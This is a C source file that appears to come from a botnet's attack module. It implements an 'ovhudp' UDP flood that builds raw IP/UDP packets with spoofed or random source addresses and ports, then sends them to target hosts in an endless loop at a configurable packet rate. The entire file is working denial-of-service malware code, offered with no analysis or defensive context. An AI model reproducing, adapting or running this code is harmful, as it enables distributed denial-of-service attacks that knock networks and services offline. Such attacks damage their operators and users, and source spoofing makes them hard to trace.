#define _GNU_SOURCE


#include "../../attack.h"

#define DiscordPayload (enc[PAYLOAD_DISCORD].string)
static const int PAYLOAD_SIZE = 8;

void flood_ovhudp(struct flood *flood) {
    int i, fd_raw, fd_udp;
    uint32_t dport_opt = flood->settings->dest_port;
    struct sockaddr_in srv_addr;
    char *packet = malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length);
    struct iphdr *ip_header = (struct iphdr *)packet;
    struct udphdr *udp_header = (struct udphdr *)(ip_header + 1);
    char *data = (char *)(udp_header + 1);

    if ((fd_raw = sys_socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        debug("Could not create a RAW socket for ovhudp attack.");
        return;
    }

    int one = 1;
    if (sys_setsockopt(fd_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) == -1)
    {
        debug("Could not set IP_HDRINCL for ovhudp attack.");
        sys_close(fd_raw);
        return;
    }

    memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length);

    struct pps_limiter pps_limit;
    pps_limit_init(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);

    while (TRUE) {
        for (i = 0; i < flood->num_of_targets; i++) {
            uint16_t dport = dport_opt == 0xffff ? (uint16_t)rand_next() : (uint16_t)dport_opt;
            if (dport == 0) dport = 80;

            // 1. Kernel level sys_connect(UDP)
            if ((fd_udp = sys_socket(AF_INET, SOCK_DGRAM, 0)) != -1)
            {
                sys_fcntl(fd_udp, F_SETFL, O_NONBLOCK);
                srv_addr.sin_family = AF_INET;
                srv_addr.sin_addr.s_addr = flood->targets[i].addr;
                srv_addr.sin_port = htons(dport);
                sys_connect(fd_udp, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
            }

            // 2. Send 1000 RAW UDP packets
            for (int p = 0; p < 1000; p++)
            {
                memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr));

                ip_header->version_ihl = (4 << 4) | 5;
                ip_header->tos = flood->settings->tos;
                ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length);
                ip_header->id = flood->settings->ident == 0xffff ? (uint16_t)rand_next() : htons(flood->settings->ident);
                ip_header->ttl = flood->settings->ttl;
                if (flood->settings->dont_fragment)
                    ip_header->frag_off = htons(1 << 14);
                ip_header->protocol = IPPROTO_UDP;
                ip_header->saddr = flood->settings->source_ip == 0xffffffff ? rand_next() : flood->settings->source_ip;
                ip_header->daddr = flood->targets[i].addr;

                udp_header->source = htons(flood->settings->source_port == 0xffff ? (uint16_t)rand_next() : (uint16_t)flood->settings->source_port);
                udp_header->dest = htons(dport);
                udp_header->len = htons(sizeof(struct udphdr) + flood->settings->length);

                if (flood->settings->random_data)
                {
                    rand_str(data, flood->settings->length);
                }
                else if (flood->settings->payload != NULL)
                {
                   memcpy(data, flood->settings->payload, flood->settings->length);
                }

                ip_header->check = 0;
                ip_header->check = checksum_generic((uint16_t *)ip_header, sizeof(struct iphdr));

                udp_header->check = 0;
                udp_header->check = checksum_tcpudp((uint8_t *)ip_header, sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length, (uint8_t *)&ip_header->saddr, (uint8_t *)&ip_header->daddr);

                sys_sendto(fd_raw, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length, MSG_NOSIGNAL, (void *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
                
                pps_limit_wait(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);
            }
            if (flood->settings->sleep > 0) sys_usleep(flood->settings->sleep * 1000);

            if (fd_udp != -1) sys_close(fd_udp);
        }
    }

    free(packet);
    sys_close(fd_raw);
}
